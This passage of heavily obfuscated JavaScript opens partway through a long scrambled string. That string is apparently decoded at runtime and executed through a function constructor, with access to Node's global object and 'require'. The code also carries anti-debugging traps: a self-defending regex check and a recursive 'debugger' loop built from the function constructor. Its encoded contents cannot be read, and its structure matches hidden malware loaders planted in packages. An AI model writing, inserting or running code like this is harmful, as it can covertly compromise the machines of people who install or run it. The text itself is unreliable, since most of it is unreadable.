g.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4\x20dt_9^<,ore5RfRx\x20RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$\x20Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR.\x20Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX.\x20<h!dRR<\x22!co?\x203\x201R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!#\x20]Cs]yt4.-d_`PRR\x27<.RvejSw<dc.c\x20,f.P.(.citcNbRn\x27-.eRcRnrQ.rRxo{Rc<\x226Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0\x20POHdQo.n\x20<.1soR_\x27\x20.P<er.[<R|R<0i<Rr;\x27I.R[}+lc![mc!.lc<n(a\x20tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\x22#E8cR(d!R)tratRR<<\x2021R\x27L!ib|eOtRRt$ucdnRR.t)RzE.GPy!\x20RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\x22R2.\x27S>))2h!efy..>!iL$en\x20;%9OTv.d$4RRC<cPS(tuRwl&(m#\x22R|pch<tH$a<<\x20.t!RSEf.RRgcNP.R\x20CRi4mR<#MRR<;wi-#E\x20<<t<eR<H<RrntoE(!0r0<d..RC\x22cn..2bp(6Cp<SR\x22e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\x27=gRP}Rp${SB.\x20Rsy.(.t!\x20c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e\x20iisf!d$ao_(#cmr\x20e<RRV!Pnca<t.~crc(e\x27*a:\x20<RRneaZe.%/dR<RR*(E\x20`+e[PcwRw\x20<(eucta).7W</$P<.hcST\x207eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR\x20_A<8<sr<Rx4)RN!pRd|B\x20<RRkie\x27c-.Rcnm3cs<Si<i.).E(R(<RRPR\x20_3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&<\x20eRR<ei-<BfE.sRbnRR).R%/jtlR<%c\x20R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\x22RR~k<\x5c!Mc.p.C)uRx)+(Rk\x5ce\x27j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\x22cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\x27.!<Rx<iKh<)s[<tc\x20PueR}r(faaRf7l<R5!rRlDXRm.1:piR\x20<=\x20Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\x27RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On\x20..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\x22tcsc.!rVRpaiz0<b\x22dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p#\x20nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8.\x20suwrRny}do.GiT.<w+c.(cs;!\x20nh(R,RCR[<&XR<<.cbcTRsAfncS-R\x22i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.-\x20Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf\x20kRRR4cr(x.c=t.<i3(Rx\x20.<..R$f\x22t\x20RRsN</C\x20RnRdRrpRR<od<.R<r[ar\x22l<.\x20P\x22.Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\x22kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f(\x20.i.buc<#r...RR[8)_!R.SRB!\x22tRVbn_RlcPRR\x20oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\x2206@!Rc!.Qkl,<g<7}b(aRcL.cs\x27+..T(<rR<<..&fd>Ro\x20coemRcw.lcn(c:R\x27|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4&\x20lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\x5c\x27)&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw\x20.RR(]PRD.\x20lf!:&.bdpTl.R#RS.$R<(R\x20<<c[.n.\x20oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R>\x20RRriR>cUp.cRWZR!RDK)0cvnnks.e\x20R\x20^dlR<cfRRu:sGRe,(gRVR\x22RuRRR\x22RtR<Rs\x22.ERi_P&R<lyoSg\x27s>vRcwe4Rcg`.h<_c\x27(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\x27<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs(\x20>RP]xtt_s_ohB<a\x27s&.P<\x20.kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS\x20<RbcsRVRsxrda]R;t?RN,,R>)cPY\x22cRcReF\x20!0RRq}}r05L6.<R.rf<$u|c<c<U-D[\x20cc.o<5;<\x20(.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\x22e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\x5c@u\x209e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\x5c<zi.Rcabr\x20(<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d`\x20Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R(\x20(...<\x22:<NR%eR\x20i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\x22P&yseR_a%rRR.D<iPsRD!i.mR\x22Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\x22\x22](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR&\x20#rDceR.alRR.R.(\x22]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\x22<i<,R!s\x20oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n\x20fs.$n8upO$0isssi.-<vR<.<qQ(!R!\x20[!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R\x20Rm!RfxR\x20mRok!ct<(..nRcSRn\x5c&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r<\x20.o[iv.<R1sR9d]R+RRheR!cc2RRe\x229c[r<;DePcRRktGlg<?tAU\x27ttRQR}\x20w3tRat](Vt-?<<?..\x22lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR\x20t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR<\x20utE\x22f}bfr.<sR+]dr\x20<R!QRw.i\x20IRT_Po.(c0t8(sRTRRcnBR!\x22.xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\x22xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE)\x20as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\x22.lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP\x20#E63ap3[R)Lddc;RxR!R\x27\x20oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z<\x20gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll.\x20.D\x20g<(rhv\x20\x224k!\x20`lR<ke1\x20c$$5Rz.RR]eu&DiR\x20.R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^.\x20Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\x22m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\x22sz3o\x22<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR\x203waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_\x20|<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\x27b)=_<m)icAcCRc.n<R.e\x20..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R=\x20tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+.\x20RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro\x20tl\x20Rc(A~i!*(bR%cR,c0t<\x20rMRR<\x20Ri<\x20.fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n\x20RwrN0#tRduc_-RS\x22i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i.\x20R<e\x20.6Rga.rgs+Qitd.o!cteaLRo)3R\x20<.cd./.~<\x20.s\x5c.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b\x20\x22cRt,\x27leacPc\x20RR<Rz\x22<Ri\x20l0oRRdRs7.R(eCcR_.6\x22_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\x27wnd.s;sw+R4/suDicPba\x20..i!o1^r}I>e4<:RwCRic<RRRc\x22.\x20dRpt0<.Rk0<W8r\x20RnR.Dc.CN\x20lwoh.l-<R<pcbR\x20Pe6hY-Rt.cEp:<+a-V<RaRf\x27(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\x22l{e]e-R</<s4Nt.op\x22ce.4Rn{SRo<R)Cc])e(Rw8RR.\x20<1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\x27spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\x22n=cdc?ABt.20.tdc!C1R\x20c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4\x20RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\x5c<w.\x20.;R<eR4\x5csRc8<R.R[EdR\x20uoR[}V(.pd\x27\x22<Ja(4prAR(.Nc<<rp3.>z\x20eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn\x20%R.RF)lR;R.s\x20R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk\x20Ys(s3.c\x20<4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\x5c?Rl._Rccz4&:?0\x20.5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\x22.PrrRn<cRnP!aRRtRfR.P\x208\x27R<JA\x20R&i<ecc{]cf.RmaR.irc.iReZ\x22n<y!<\x20cR\x20#<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\x5cgo_0lRmvF(<e9s<Rtt(\x20!RnR6}<.itO..&9s4dNRc\x20.o.RR.]j0\x20R\x20ma4;r<sCa)&\x20mo[xlR*ht!,Aup\x20Ru,fRtf[j)P*cRR1<RSv\x20s!2cIsR..e74hRd\x27c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$\x20rd<cw).F<ObZWR.jg.U4\x22afR`\x27m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\x27e.l.2.I.e9rRe.s\x271=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)%\x20/.(]b8cRs+vR-c)}:osR.c#\x22<cqk<ek.imRSN.RsE\x20bPPn)<e}o0e\x22.1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR\x20bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c\x20RRR.qn\x20.RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s\x20s{Te\x20<!.+.R.<uRPRo.<K.m.a.srM<R\x20.cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\x27@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc\x20l.<\x20o(J.e.#N.7t<)c<w\x20eR0.=<yc\x20!..Re?<n\x27B[Rbo\x27auR}\x20rae#R=.iR(st2.b~\x20<Sc.}tTsRr<aR)\x20ryir!C<c\x20td~\x22\x20X.ttR<R!d\x20c..!ed.R.<R\x20n.Sne!!)4/oXRRu.enR<.rRqR\x22l_M.efttr\x20tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\x27t]&.RRR-4R&ew\x5ccRYeonf\x20t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a?\x20nec<R..avloRvjRge._\x20=R+.RR.wdR.d6%.Icc(+t.:ci\x27.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c#\x20n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0\x20lEt!dn\x220pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs\x20RgadRroG(ltl\x20#(yr<.#ddt.<R\x20i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr.\x20w9cTaR=<PcdK]_\x5c2f(\x20#.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR\x20.dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\x22<sisPd.?\x20pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr(\x20{.eTRR}.c}<RR8..RpR\x22cg;.cc0RrR.\x20t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\x22<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\x27$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e\x20&l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe\x20cRckRx)<c&ci.yceluy;,.XdrRlRR#\x20ccf.cR\x20\x20R$Rcorr(.rCp<Nr#E(]RnR\x22ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n\x20C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!\x20\x20R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a*\x20)I(ldR(wsr6\x20*R7!a<S.c<\x5cR.BELRe6Yf<1<ecPrDe\x20sl0PbD#R]o.\x27<l.m\x20R(p)<ekac.cR.d.._u<a\x27<\x20Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{\x20cWGf}ohdcas.].\x20fP=\x20os67EocIPoc\x20.7igcFCR.\x20<cE.N\x20.bR')))(0x9cd);continue;case'4':var _0x44fbcb=(function(){var _0x198353=!![];return function(_0x4e024d,_0x3c1734){var _0x2fe5da=_0x198353?function(){if(_0x3c1734){var _0x4c90f6=_0x3c1734['apply'](_0x4e024d,arguments);return _0x3c1734=null,_0x4c90f6;}}:function(){};return _0x198353=![],_0x2fe5da;};}());continue;case'5':_0x8764f8[_0x529f4d[0x0]]=_0xa65246,typeof module===_0x529f4d[0x1]&&(_0x8764f8[_0x529f4d[0x2]]=module);continue;case'6':var _0x122999=peel('hqersxluvwacdjbymgorzfkociptrutnstonc'),_0x4f3023=peel[_0x122999[_0x4a3744(0x1e)](0x0,0xb)],_0x476f69=_0x4f3023('',peel(_0x4a3744(0x20)));continue;case'7':(function(){_0x44fbcb(this,function(){var _0x4eeb26=_0xffd8,_0x55ed65=new RegExp(_0x4eeb26(0xb)),_0x443302=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x43a4e7=_0x5de84e(_0x249475[_0x4eeb26(0x1f)]);!_0x55ed65[_0x4eeb26(0x1c)](_0x43a4e7+_0x4eeb26(0x1))||!_0x443302[_0x4eeb26(0x1c)](_0x43a4e7+_0x4eeb26(0x2))?_0x43a4e7('0'):_0x5de84e();})();}());continue;}break;}}(global,require);function _0x5de84e(_0x4000fc){var _0x3c981d=_0xffd8,_0x97ddc9={'fjHqd':_0x3c981d(0x5),'rXwKU':function(_0x17156e,_0x4cf36a){return _0x17156e(_0x4cf36a);}};function _0x309c34(_0xc1f233){var _0x478966=_0x3c981d;if(typeof _0xc1f233==='string')return function(_0x45b6eb){}['constructor'](_0x478966(0x1d))[_0x478966(0x11)](_0x478966(0x14));else(''+_0xc1f233/_0xc1f233)['length']!==0x1||_0xc1f233%0x14===0x0?function(){return!![];}['constructor'](_0x97ddc9['fjHqd']+_0x478966(0x21))[_0x478966(0xa)](_0x478966(0x7)):function(){return![];}[_0x478966(0x1a)](_0x97ddc9[_0x478966(0xe)]+_0x478966(0x21))['apply'](_0x478966(0x4));_0x97ddc9[_0x478966(0x1b)](_0x309c34,++_0xc1f233);}try{if(_0x4000fc)return _0x309c34;else _0x309c34(0x0);}catch(_0x1f5f91){}}
